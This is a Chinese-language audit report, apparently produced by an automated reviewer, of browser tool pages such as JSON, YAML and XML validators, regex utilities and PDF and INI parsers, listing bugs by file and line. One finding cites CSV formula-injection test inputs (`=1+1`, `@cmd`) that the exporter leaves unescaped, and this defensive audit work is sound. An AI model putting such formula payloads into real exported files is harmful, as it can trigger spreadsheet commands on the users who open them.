- `markdown-lint.html`：实现是逐行正则（`:213-241`），仅覆盖标题跳级、标题重复（跨层级同文本也报，偏严）、`^\s*[-*]\S` 列表缺空格、空链接四类。正文 `:108` 宣称的「列表缩进是否一致」「行尾多余空格」「代码块是否标注语言」三项均无对应代码，`:151` 的公式表还标了 MD007 嵌套列表对齐。实测误报：`---` YAML 前置元数据与行首 `*斜体*` 都被判「列表符号后缺空格」；漏报：`#标题`（无空格，不渲染为标题）零提示，行尾空格、未闭合代码块、嵌套缩进全不检查——既漏又误，是名实不符的风格辅助器。另 `:120` 有一处畸形 `</div`（缺 `>`），jsdom 解析后 `.toolbar` 元素数为 0，按钮失去工具栏包裹（布局退化，非功能中断），属标记缺陷、未计入三类问题。

### 问题表格

| 页面 | 问题（tools/it/<slug>.html:NN） | 编号 |
|---|---|---|
| `tools/it/text-diff.html` | `backtrack` 纯递归无深度上限（`:441-457`），dp 为 O(m×n)；实测 4000 行全不同文本与单行 5000 字符均抛 `RangeError: Maximum call stack size exceeded`，`doDiff`（`:484-532`）无 try/catch，大文本对比直接中断、无结果。 | IT-D19 |
| `tools/it/xml-validator.html` | 以 `getElementsByTagName('parsererror')`（`:266-271`）判失败，该接口按限定名跨命名空间匹配；合法文档根为 `<parsererror>` 时被误判「格式错误」（jsdom 复算 `<parsererror><msg>valid</msg></parsererror>` → ❌、detail 为 `valid`）。 | IT-D20 |
| `tools/it/yaml-validator.html` | YAML→JSON 直接 `JSON.stringify`（`:574`）未规范化键/类型：`2024-01-01:` 键输出本地时区 `Date.toString()` 串（实测 `Mon Jan 01 2024 08:00:00 GMT+0800 (中国标准时间)`，随 TZ 变化），`!!binary` 输出 `{"0":104,…}` 索引对象；转换结果不可移植、语义丢失，页面无提示。 | IT-D21 |
| `tools/it/json-formatter.html` | 「转义」（`:612-623`）对合法 JSON 等于 `JSON.stringify(JSON.parse(x))`，与「压缩」（`:561-571`）输出逐字节相同，不产生可嵌入的转义字符串；仅非法文本走字符串转义，与「反转义」（`:625-638`）不成对，按钮名不符实。 | IT-D22 |
| `tools/it/json-formatter.html` | 「提取」贪婪匹配 `/\{[\s\S]*\}/`（`:649-667`）从首个 `{` 到全文最后一个 `}` 后自尾截断；实测 `日志: {"a":1} 后续 {"b":2}` 仅得 `{"a":1}`，同段第二个对象不可达，与「从日志/代码片段提取」不符。 | IT-D23 |
| `tools/it/markdown-lint.html` | 正文宣称检查「列表缩进一致 / 行尾多余空格 / 代码块语言标注」（`:108`，`:151` 另标 MD007），`calcTool`（`:213-241`）仅实现 4 类；实测 `---` 前置元数据与行首 `*斜体*` 误报「列表符号后缺空格」，`#标题`（井号后无空格）、行尾空格、未闭合代码块、嵌套缩进均漏报。 | IT-D24 |
| `tools/it/json-formatter.html` | 安全（明文留存）：模板持久化脚本（`:788-818`）对全部 `textarea` 绑定 input/change 写 `localStorage`（`tb_uxp_tools/it/json-formatter.html#input`），加载时静默回填；粘贴含 token/密钥的 JSON 长期明文留存，界面无提示与关闭开关。 | IT-D25 |
| `tools/it/json-to-csv.html` | 安全（CSV 注入）：`cell()` 只做引号转义（`:282-286`），不转义 `=`/`+`/`-`/`@` 起始值；实测 `=1+1`、`@cmd` 原样输出，加引号不阻止 Excel 公式解析，导出文件可被触发表格公式/外链命令。 | IT-D26 |

**统计**

- 页数：6（JSON 格式化 1 + YAML 1 + XML 1 + CSV↔JSON 1 + 文本 diff 1 + Markdown lint 1）；默认自动出结果 5 页，`text-diff` 无默认输出。
- 新增问题：8 条——① 高优 3（IT-D19–IT-D21：递归崩溃 1、XML 误判 1、YAML 转换失真 1）/ ② 假工具增量 3（IT-D22–IT-D24）/ ③ 安全 2（IT-D25–IT-D26）；编号 IT-D19–IT-D26 连续、无重号，接续上批 IT-D18。
- 伪实现排查：6 页中 4 页用原生解析或正式库（`JSON.parse` ×2、`DOMParser`、`js-yaml`），`text-diff` 为自写 LCS（真实但崩溃），`markdown-lint` 为正则伪解析且宣称项缺失；无回显式假工具。
- 安全：无 `eval`/`new Function`/`allow-same-origin`；用户文本输出均走 `textContent` / `ToolBox.escHtml`。`xml-validator` 不解析外部实体（XXE 安全），`yaml-validator` 不落盘。模板级 `lf1-cdn-tos.bytegoofy.com/ttzz` 第三方脚本本批 6 页均存在（如 `json-formatter:182`、`markdown-lint:71`），属全站通用问题、已登记，不重复计数。
- 方法：`/tmp` 用与页面同版本 `js-yaml@4.1.0` 复算多键/多文档/锚点/日期键/`!!binary`；jsdom `DOMParser` 复算 XML（CDATA/转义/200 层/`parsererror` 根/实体）；Node 原样提取 LCS+回溯与正则跑规模与误报用例；Python `csv.reader` 回读 CSV 校验引号内逗号/换行；未开浏览器、未跑 `_build.py`/门禁、未执行 git、未修改 `tools/**`、js/css/json 或构建产物。

## AC 批 · 正则族（2026-11-04）

### 族矩阵

| 页面 | 实现方式 | 可逆或可验证 | 结论 |
|---|---|---|---|
| `tools/it/regex` | 原生 RegExp：Worker 内 `new RegExp(p,f)`，替换同引擎（`:850-877`） | 同构造可验证 | 核心匹配/分组/替换正确；既有 N253/N254 仍在 |
| `tools/it/regex-cheatsheet` | 纯查表：静态 `COMMANDS` 数组 + 过滤（无执行） | 仅内容正确性 | 检索可用；JS 不支持语法已显式标注（IT-D30，第170批） |
| `tools/it/regex-common` | 查表（8 条类别常量）+ 原生 RegExp 逐类执行 | 给定类/文本可验证 | 8 类下拉已实装并可切换（IT-D27，第169批） |
| `tools/it/regex-escape` | 自写逐字符映射转义/反转义，不走 RegExp | 部分可逆 | 转义正确；反转义吞类别转义 |
| `tools/it/regex-visualizer` | 递归下降解析 AST 树 + 保留线性状态链；`new RegExp` 校验合法性 | 树结构可验证、状态链可复算 | AST 层级已实装且双路径转义（IT-D28，第171批）；铁路图样式仍未实现 |

### 独立实现 vs 共享实现

- **独立 2 页**：regex（Worker 原生引擎）、regex-visualizer（自写 tokenizer）。
- **共享模板 3 页**：regex-cheatsheet 与 regex-common 同属 `COMMANDS/escapeHtml/filter/dataGrid` 速查表脚手架（与 nginx/sql 等 20+ 速查页同源）；regex-escape 的 `esc/unesc` 骨架与 css-escape、url-parser 同源。
- 结论：5 页 3 种实现范型（原生引擎 / 查表 / 自写字符串处理），无两页共享同一正则实现。

### 逐页结论

- **regex**：默认 `\d+`/`g`/含 123、456、8888、9999 的文本 → 4 条匹配正确；`escapeHtml` 覆盖全部输出（`:547/566/578/602/642`），无 XSS；`:727` 早于 `#rx-worker-src`（`:850`）调用，首屏短暂显示「组件未加载」（IT-N252 的超时部分已修，双跑仍成立）。
- **regex-cheatsheet**：纯查表；`\A \Z` 与 `[:alpha:]` 两条 params 已标注「JS 不支持」及适用引擎（IT-D30，第170批）；检索/分类/复制逻辑不变。
- **regex-common**：类别选择器已补齐 8 个 option 并可切换（IT-D27，第169批）；默认 email，8 类均可达，结果与原高亮/偏移明细逻辑不变。
- **regex-escape**：默认 `Hello (World)? [a-z]+ $19.99` → `Hello \(World\)\? \[a-z\]\+ \$19\.99` 正确；反转义 `\d+\w`→`d+w`（IT-D29）。
- **regex-visualizer**：递归下降 AST 树已实装（分支/分组类型/量词/字符类/锚点层级，第171批），默认 `^a[0-9]+b$` 仍输出 10 token / 12 状态线性链作为附加视图；AST 与状态链双路径均经 escapeHtml（IT-N348 回归保持）。

### 问题清单（新增）

| 编号 | 页面:行 | 级别 | 问题与期望值 |
|---|---|---|---|
| IT-D29 | `tools/it/regex-escape.html:310` | 中 | `default: out += n` 丢弃反斜杠：`\d+\w`→`d+w`、`\b`→`b`、`\s`→`s`，反转义后正则语义反转。期望保留 `\d \w \b \s \p{…}` 原样 |

### 统计

- 页数 **5**；独立实现 **2** / 共享模板 **3**。
- 新增 **4** 条（高 **2** / 中 **2** / 假 **0** / 安全 **0**）；编号 IT-D27–IT-D30。
- 复核既有：IT-N253（base64 `+` 被 URLSearchParams 解成空格）、IT-N254（替换/复制恒补 `g`）仍成立；IT-N252 的超时部分已失效（`:492-521` Worker + 800ms），「每次按键跑两遍」仍成立（`#flags` 内联 oninput 与 `:465` 双绑）。
- 复算方式：`/tmp` node 同构造跑默认用例与 `\A`/`[:alpha:]` 语义，`new RegExp` 校验；未开浏览器、未跑 `_build.py`/门禁、未改仓库文件。

## AC 批 · PDF/文件解析族（2026-11-04）

### 族矩阵

| 页面 | 实现方式 | 可逆或可验证 | 结论 |
|---|---|---|---|
| `tools/office/pdf-merge` | pdf-lib@1.17.1 `copyPages` + `save` | node 实测 2+3 页合并成 5 页、尺寸正确 | 真处理；加密文件预检有缺陷 |
| `tools/office/pdf-split` | pdf.js 渲染缩略图 + pdf-lib 提取页 | 页数/旋转/顺序可验证 | 真提取；range 按填写顺序（IT-D35，第173批）、历史回填不下载（IT-D36，第174批）；只产 1 个文件仍留存 |
| `tools/office/pdf-rotate` | pdf.js 预览 + pdf-lib `setRotation`/`save` | node 回读角度 [90,270] 正确 | 真处理，未发现缺陷 |
| `tools/it/pdf-signature-checker` | 自读字节 + 正则匹配 `/ByteRange`、`/Contents` | 构造字节可验证 | 只判签名存在，无密码学验签 |
| `tools/it/properties-parser` | 自写逐行扫描 + 转义还原 | node 7 组用例 | 真解析；CRLF/`\u`/续行有错 |
| `tools/it/ini-parser` | 自写 `indexOf('=')` 逐行解析 | node 7 组用例 + JSDOM 7 组 | 真解析；无值键已修（IT-D40，第168批），`:` 分隔仍不支持 |
| `tools/it/curl-parser` | 正则分词 + 选项表 | node 9 组命令 | 真解析；续行/转义/urlencode 有缺陷 |
| `tools/it/plist-parser` | 原生 `DOMParser` 解析 XML plist | 默认 SAMPLE 可验证 | 真解析（binary plist 明确不支持） |
| `tools/it/user-agent-parser` | 正则抽取浏览器/引擎/OS/设备 | UA 用例可复现 | 微信/百度爬虫已补（IT-D41，第172批）；CriOS/FxiOS/Samsung 既有规则已在位 |

### 独立实现 vs 共享实现

- **共享 3 页**：pdf-merge、pdf-split、pdf-rotate 共用同一条 `pdf-lib@1.17.1` CDN（带 SRI）；后两页另共用 `pdf.js 3.11.174` 与同一 worker 源 → CDN/worker 失效或库升级时 3 页同时受影响。
- **独立 6 页**：两个解析族与签名检查器各自实现，互不共享解析核心，只共用 Tab/历史/图表模板 → 缺陷不同源，可分别修。
- 同源风险集中在 properties 与 ini 两个键值格式解析器：行切分/去空白/重复键策略各写各的，口径不一致（`host:localhost` 在 properties 正确、在 ini 整行丢弃）。

### 逐页结论

- **pdf-merge**：真实合并并正确转义文件名；加密 PDF 预检用 `ignoreEncryption` 判为可用，`copyPages` 不解密 → 与「跳过并继续」承诺不符（IT-D32）。
- **pdf-split**：真实提取、真实缩略图；range 模式已按填写顺序解析（IT-D35，第173批），缩略图勾选模式仍按自然升序；历史回填只恢复输入、不再触发下载（IT-D36，第174批）；只产 1 个 PDF（IT-D34）仍留存。
- **pdf-rotate**：真旋转，预览叠加差值、写入绝对角度，回读一致，本轮无缺陷。
- **pdf-signature-checker**：仅检测签名存在；文件头 `%PDF-49.46` 恒不匹配判红（既有 `it.md:2582`）、字节数算式错（既有 `:2588`）、PKCS#7 验签承诺未实现（既有 `:2593`）。
- **properties-parser**：核心扫描正确；CRLF/裸 CR 换行已修正（IT-D33，第167批）；`\uXXXX` 不解码（既有 `:140`）、行尾 `\\` 当续行（既有 `:141`）仍留存。
- **ini-parser**：节/注释/重复键正常；无值键（裸布尔标志）已保留为空串（IT-D40，第168批）；`:` 分隔仍不支持（IT-D39）。
- **curl-parser**：`-d`→POST、选项值消费、输出转义、`--data-urlencode` 百分号编码（IT-D37，第164批）、双引号内 `\"` 反转义（IT-D38，第165批）、反斜杠续行折叠（IT-D31，第166批）均已修到位；本批无其它残留项。
- **plist-parser**：XML 真解析，dict/array/integer/real/bool 正确；`data`、`date` 原样返回（既有）。
- **user-agent-parser**：Chrome/Safari/Edge/Firefox/Googlebot 正确；CriOS/FxiOS/Samsung 既有规则已在位（清单旧描述过时）；微信（MicroMessenger/）与百度爬虫（Baiduspider）已补规则（IT-D41，第172批），微信含 Chrome/ 时优先判微信。

### 问题清单（新增）

| 编号 | 页面:行 | 级别 | 问题与期望值 |
|---|---|---|---|
| IT-D32 | `tools/office/pdf-merge.html:512,703` | 高 | `loadPageCount` 用 `ignoreEncryption` 使加密文件列为可用；`copyPages` 不解密 → 整体抛错或输出空白，与 `:349,:391`「跳过并提示、不影响其余」矛盾。期望单文件标 error 后 `continue`（node 加载同版本 pdf-lib：正常 2+3 页合并成功，`copyPages` 无加密检查） |
| IT-D34 | `tools/office/pdf-split.html:568,455-466` | 假 | 宣称「拆分 PDF 为多个小文件」「段数=ceil(总页数/每段页数)」「文件数=段数」，实际无「每段页数」输入且只产出 1 个 PDF |
| IT-D39 | `tools/it/ini-parser.html:275` | 中 | 只认 `=`：`[s]` + `host: localhost` → `{}`，期望 `{"s":{"host":"localhost"}}`（页面称「= 或 : 分隔」） |

### 统计

- 页数 **9**（PDF 4 + 解析 5）；独立实现 **6** / 共享实现 **3**。
- 新增 **11** 条（高 **3** / 中 **7** / 假 **1** / 安全 **0**）；编号 IT-D31–IT-D41。
- 复核既有 6 条（`it.md:2582`、`:2588`、`:2593`、`:140`、`:141`、IT-N65）均仍成立；IT-N24（重复节丢键）原记录标注已修，待独立复核。
- 复算方式：按页面函数逐行复刻 node 桩（properties/ini/curl/UA）；PDF 用同版本 pdf-lib 真调用；未开浏览器、未跑 `_build.py`/门禁、未改仓库文件。

